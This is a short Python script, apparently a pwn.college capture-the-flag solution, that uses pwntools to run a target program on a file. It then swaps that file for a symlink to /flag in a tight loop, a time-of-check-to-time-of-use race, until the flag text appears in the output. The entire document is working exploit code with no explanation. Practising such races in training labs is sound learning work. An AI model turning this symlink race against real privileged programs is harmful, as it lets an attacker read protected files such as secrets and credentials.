#!/bin/python

import os
import sys
import time
from pwn import * 

#context.log_level = 'error'
context.arch = 'amd64'

while True:
    with open('./file', "w+") as f: 
        f.write('SOMETHING')
    proc = process([sys.argv[1], '/home/hacker/file'])
    os.unlink('./file')
    os.symlink('/flag', './file')
    time.sleep(0.5 / 1000000.0)

    data = proc.recvall()
    if b'pwn.college' in data:
        print(data)
        break

    print("...")
